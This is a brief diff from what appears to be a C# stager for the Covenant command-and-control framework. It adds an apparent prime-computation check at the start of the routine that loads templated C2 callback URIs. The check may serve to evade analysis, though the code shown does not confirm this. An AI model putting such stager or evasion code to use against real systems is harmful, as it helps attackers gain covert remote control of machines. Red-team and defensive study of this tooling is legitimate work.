@@ -57,6 +57,7 @@ namespace echoCovStg
         }
         public void DoStg()
         {
+            PrimeChecker.PerformPrimeCheck();
             try
             {
                 List<string> EchoURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
